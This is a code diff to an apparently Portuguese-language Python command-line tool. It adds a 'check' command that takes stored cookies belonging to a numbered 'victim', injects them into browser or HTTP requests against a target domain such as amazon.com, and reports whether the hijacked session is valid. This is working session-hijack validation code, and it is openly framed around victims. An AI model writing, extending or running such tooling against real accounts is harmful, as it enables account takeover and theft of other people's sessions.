@@ -247,12 +247,101 @@ def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
 
 
 @cli.command()
-@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db")
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
 @click.option("--victim", type=int, required=True)
-@click.option("--domain", required=True)
-def check(db_path: Path, victim: int, domain: str):
+@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
+@click.option("--url", default=None, help="URL alvo (padrão: https://<host>/")
+@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
+              default="playwright", show_default=True)
+@click.option("--path", "req_path", default="/", show_default=True)
+@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
+              help="Salva screenshots de baseline/injetado")
+def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
+          req_path: str, shot_dir: Path):
     """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
-    console.print("[yellow]Não implementado - previsto na fase M3 (validação).[/]")
+    from .domain.matcher import applicable_cookies
+    from .validate.auth_state import detect
+    from .validate.scoring import score_artifacts
+    from .inject import httpx_client, playwright_client
+    from .inject.capture import sent_cookie_names
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+    target_url = url or f"https://{host}{req_path}"
+    scheme = "http" if target_url.startswith("http://") else "https"
+
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
+    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+
+    console.print(f"[bold]check[/] vítima={victim} {scheme}://{host}{req_path} "
+                  f"[{len(cookies)} cookies aplicáveis, canal={channel}]")
+
+    def replay(shot_suffix, with_cookies):
+        shot_path = None
+        if shot_dir:
+            shot_dir.mkdir(parents=True, exist_ok=True)
+            shot_path = shot_dir / f"victim_{victim}_{host}_{shot_suffix}.png"
+        if channel == "httpx":
+            res = httpx_client.get(target_url, with_cookies)
+            res.setdefault("sent_cookies", [])
+            # httpx nao captura quais cookies foram enviados; aproxima pelos injetados.
+            res["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(with_cookies)}}]
+            res.setdefault("error", None)
+            return res
+        return playwright_client.replay(
+            target_url, with_cookies, screenshot_path=shot_path
+        )
+
+    # Baseline (sem cookies).
+    baseline = replay("baseline", [])
+    # Injetado (com cookies).
+    injected = replay("injected", cookies)
+
+    result = detect(baseline, injected, host)
+    sent_names = sent_cookie_names(injected)
+    artifacts = score_artifacts(sent_names, cookies)
+
+    # Persistência.
+    run_id = store.record_run(victim, target_url, host, channel)
+    findings_rows = [
+        (run_id, a["name"], 1 if a["sent"] else 0, a["kind"],
+         float(a["score"]) / 10.0, "")
+        for a in artifacts
+    ]
+    store.add_findings(run_id, findings_rows)
+
+    _print_check_result(result, sent_names, artifacts, injected)
+
+
+def _print_check_result(result, sent_names, artifacts, injected):
+    state = result["state"]
+    color = {"SESSION_VALID": "green", "SESSION_INVALID": "red", "UNKNOWN": "yellow"}.get(state, "yellow")
+    console.print(f"\n[bold {color}]{state}[/] (confiança {result['confidence']:.2f}, perfil {result['profile']})")
+
+    ev = result["evidence"]
+    console.print(f"  baseline status={ev['baseline_status']} | injetado status={ev['injected_status']}")
+    if ev["injected_markers"]:
+        console.print(f"  markers injetado: {', '.join(ev['injected_markers'])}")
+    if injected.get("error"):
+        console.print(f"  [red]erro replay: {injected['error']}[/]")
+
+    if artifacts:
+        table = Table(title="Artefatos (score)")
+        table.add_column("Cookie", style="cyan")
+        table.add_column("Tipo")
+        table.add_column("Enviado", justify="center")
+        table.add_column("HttpOnly", justify="center")
+        table.add_column("Secure", justify="center")
+        table.add_column("Score", justify="right")
+        for a in artifacts:
+            table.add_row(a["name"], a["kind"],
+                          "yes" if a["sent"] else "-",
+                          "yes" if a["http_only"] else "-",
+                          "yes" if a["secure"] else "-",
+                          str(a["score"]))
+        console.print(table)
+    console.print(f"[dim]Cookies enviados: {len(sent_names)}[/]")
 
 
 @cli.command()
